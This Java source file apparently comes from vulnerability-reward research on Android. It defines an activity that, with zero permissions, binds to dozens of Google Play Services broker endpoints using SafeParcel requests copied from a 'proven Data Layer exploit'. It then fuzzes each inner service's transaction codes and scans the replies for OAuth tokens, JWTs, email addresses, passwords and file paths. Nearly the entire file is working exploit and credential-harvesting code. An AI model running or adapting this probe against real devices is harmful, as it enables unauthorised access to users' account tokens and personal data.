package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class GmsBrokerProbeActivity extends Activity {
    private static final String T = "BROKER";
    private static final String BROKER_DESC = "com.google.android.gms.common.internal.IGmsServiceBroker";
    private static final String GMSCB_DESC = "com.google.android.gms.common.internal.IGmsCallbacks";

    // {action, label, service_id}
    // Service IDs from GMS internal constants
    private static final Object[][] SERVICES = {
        {"com.google.android.gms.people.service.START", "People", 5},
        {"com.google.android.gms.auth.service.START", "Auth", 68},
        {"com.google.android.gms.drive.ApiService.START", "Drive", 16},
        {"com.google.android.gms.cast.service.BIND_CAST_DEVICE_CONTROLLER_SERVICE", "Cast", 10},
        {"com.google.android.gms.nearby.connection.service.START", "NearbyConn", 49},
        {"com.google.android.gms.auth.api.signin.service.START", "SignIn", 58},
        {"com.google.android.gms.wallet.service.BIND", "Wallet", 44},
        {"com.google.android.gms.identity.service.BIND", "Identity", 19},
        {"com.google.android.gms.games.service.START", "Games", 1},
        {"com.google.android.gms.phenotype.service.START", "Phenotype", 65},
        {"com.google.android.gms.clearcut.service.START", "ClearCut", 40},
        {"com.google.android.gms.location.internal.GoogleLocationManagerService.START", "Location", 9},
        {"com.google.android.gms.fido.fido2.regular", "FIDO2", 73},
        {"com.google.android.gms.safetynet.service.START", "SafetyNet", 45},
        {"com.google.android.gms.kids.service.START", "Kids", 42},
        {"com.google.android.gms.auth.api.credentials.service.START", "Credentials", 71},
        {"com.google.android.gms.tapandpay.service.BIND", "TapAndPay", 43},
        {"com.google.android.gms.trustagent.bridge.service.START", "TrustAgent", 51},
        {"com.google.android.gms.smartdevice.d2d.TargetDeviceService.START", "SmartD2D", 269},
        {"com.google.android.gms.people.service.START", "PeopleSync", 6},
        {"com.google.android.gms.people.service.START", "PeopleInternal", 7},
        {"com.google.android.gms.auth.service.START", "AuthProxy", 12},
        {"com.google.android.gms.people.service.START", "AccountData", 8},
        {"com.google.android.gms.fitness.InternalApi.START", "Fitness", 29},
        {"com.google.android.gms.nearby.connection.service.START", "NearbyShare", 55},
        {"com.google.android.gms.backup.GmsBackupTransport.START", "Backup", 103},
        {"com.google.android.gms.chromesync.service.START", "ChromeSync", 93},
    };

    private int svcIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== GMS Service Broker Probe v2 ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());
        Log.w(T, "ZERO PERMISSIONS — probing " + SERVICES.length + " services via IGmsServiceBroker");
        probeNextService();
    }

    private void probeNextService() {
        if (svcIndex >= SERVICES.length) {
            Log.w(T, "=== ALL SERVICE PROBES COMPLETE ===");
            return;
        }
        final String action = (String) SERVICES[svcIndex][0];
        final String label = (String) SERVICES[svcIndex][1];
        final int serviceId = (Integer) SERVICES[svcIndex][2];
        svcIndex++;

        Log.w(T, "--- [" + svcIndex + "/" + SERVICES.length + "] " + label + " ---");

        Intent intent = new Intent(action);
        intent.setPackage("com.google.android.gms");
        try {
            final ServiceConnection[] connRef = {null};
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName name, IBinder broker) {
                    Log.w(T, "[+] Broker bound: " + label);
                    final ServiceConnection self = connRef[0];
                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                getInnerService(broker, label, serviceId);
                            } catch (Exception e) {
                                Log.w(T, "[!] " + label + " err: " + e.getMessage());
                            }
                            try { unbindService(self); } catch (Exception e) {}
                            runOnUiThread(new Runnable() {
                                public void run() { probeNextService(); }
                            });
                        }
                    }).start();
                }
                public void onServiceDisconnected(ComponentName name) {}
            };
            connRef[0] = conn;
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);

            if (!bound) {
                Log.w(T, "[-] " + label + " bind failed");
                probeNextService();
            }
        } catch (Exception e) {
            Log.w(T, "[-] " + label + " bind err: " + e.getMessage());
            probeNextService();
        }
    }

    private void getInnerService(IBinder broker, String label, int serviceId) {
        final CountDownLatch latch = new CountDownLatch(1);
        final IBinder[] innerSvc = {null};
        final String[] innerDesc = {null};

        IBinder cb = new Binder() {
            public String getInterfaceDescriptor() { return GMSCB_DESC; }
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                if (code >= 1 && code <= 5) {
                    try { data.enforceInterface(GMSCB_DESC); } catch (Exception e) { data.setDataPosition(0); }
                    int status = data.readInt();
                    IBinder b = data.readStrongBinder();
                    if (b != null) {
                        innerSvc[0] = b;
                        try { innerDesc[0] = b.getInterfaceDescriptor(); } catch (Exception e) {}
                        Log.w(T, "[+] " + label + " inner binder! status=" + status + " desc=" + innerDesc[0]);
                    } else {
                        Log.w(T, "[*] " + label + " cb code=" + code + " status=" + status + " binder=null");
                    }
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    return true;
                }
                Log.w(T, "[*] " + label + " cb unexpected code=" + code);
                latch.countDown();
                return true;
            }
        };

        // Exact format from proven Data Layer exploit
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(BROKER_DESC);
            data.writeStrongBinder(cb);
            data.writeInt(1); // flag

            // SafeParcel GetServiceRequest
            int h = spBeginObject(data);
            spWriteInt(data, 1, 6);          // version
            spWriteInt(data, 2, serviceId);  // service ID
            spWriteInt(data, 3, 263332086);  // client version code
            spWriteString(data, 4, getPackageName());
            spWriteBoolean(data, 12, true);
            spFinishObject(data, h);

            broker.transact(46, data, reply, 0);

            if (reply.dataSize() > 0) {
                reply.setDataPosition(0);
                int exCode = reply.readInt();
                if (exCode != 0) {
                    String msg = safeReadString(reply);
                    Log.w(T, "[*] " + label + " sync exc=" + exCode + " " + trunc(msg, 80));
                }
            }
        } catch (Exception e) {
            Log.w(T, "[!] " + label + " getService err: " + trunc(e.getMessage(), 80));
        } finally {
            data.recycle();
            reply.recycle();
        }

        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}

        if (innerSvc[0] != null) {
            Log.w(T, "[!!!] " + label + " GOT INNER SERVICE — probing methods...");
            probeInner(innerSvc[0], label, innerDesc[0]);
        } else {
            Log.w(T, "[-] " + label + " no inner service returned");
        }
    }

    private void probeInner(IBinder svc, String label, String desc) {
        for (int tx = 1; tx <= 25; tx++) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                if (desc != null && desc.length() > 0) {
                    d.writeInterfaceToken(desc);
                }
                boolean res = svc.transact(tx, d, r, 0);
                if (r.dataSize() > 0) {
                    r.setDataPosition(0);
                    int exCode = r.readInt();
                    if (exCode == 0 && r.dataAvail() > 0) {
                        Log.w(T, "  [+] " + label + " TX" + tx + " SUCCESS avail=" + r.dataAvail());
                        extractStrings(r, label + " TX" + tx);
                    } else if (exCode != 0 && tx <= 5) {
                        String msg = safeReadString(r);
                        Log.w(T, "  [*] " + label + " TX" + tx + " exc=" + exCode + " " + trunc(msg, 80));
                    }
                }
                d.recycle();
                r.recycle();
            } catch (SecurityException se) {
                if (tx <= 5) Log.w(T, "  [!] " + label + " TX" + tx + " SECURITY: " + trunc(se.getMessage(), 60));
            } catch (Exception e) {
                if (tx <= 3) Log.w(T, "  [*] " + label + " TX" + tx + ": " + trunc(e.getMessage(), 60));
            }
        }
    }

    private void extractStrings(Parcel p, String label) {
        int saved = p.dataPosition();
        try {
            p.setDataPosition(0);
            byte[] raw = p.marshall();
            StringBuilder sb = new StringBuilder();
            for (byte b : raw) {
                if (b >= 32 && b < 127) {
                    sb.append((char) b);
                } else {
                    if (sb.length() >= 4) {
                        String s = sb.toString();
                        Log.w(T, "    " + label + " STR: " + trunc(s, 200));
                        if (s.contains("@") || s.contains("ya29.") || s.contains("eyJ") ||
                            s.contains("gmail") || s.contains("account") || s.contains("http") ||
                            s.contains("/data/") || s.contains("token") || s.contains("password")) {
                            Log.w(T, "    [!!!] SENSITIVE: " + trunc(s, 200));
                        }
                    }
                    sb.setLength(0);
                }
            }
            if (sb.length() >= 4) Log.w(T, "    " + label + " STR: " + trunc(sb.toString(), 200));
        } catch (Exception e) {}
        p.setDataPosition(saved);
    }

    // SafeParcel helpers (exact copy from proven Data Layer exploit)
    private int spBeginObject(Parcel p) { return spBeginVar(p, 20293); }
    private void spFinishObject(Parcel p, int pos) { spEndVar(p, pos); }
    private void spWriteInt(Parcel p, int fid, int val) { p.writeInt(fid | (4 << 16)); p.writeInt(val); }
    private void spWriteBoolean(Parcel p, int fid, boolean val) { p.writeInt(fid | (4 << 16)); p.writeInt(val ? 1 : 0); }
    private void spWriteString(Parcel p, int fid, String val) {
        if (val == null) return;
        int pos = spBeginVar(p, fid);
        p.writeString(val);
        spEndVar(p, pos);
    }
    private int spBeginVar(Parcel p, int fid) {
        p.writeInt(fid | 0xFFFF0000);
        p.writeInt(0);
        return p.dataPosition();
    }
    private void spEndVar(Parcel p, int s) {
        int e = p.dataPosition();
        p.setDataPosition(s - 4);
        p.writeInt(e - s);
        p.setDataPosition(e);
    }

    private String safeReadString(Parcel p) {
        try { return p.readString(); } catch (Exception e) { return null; }
    }
    private String trunc(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }
}
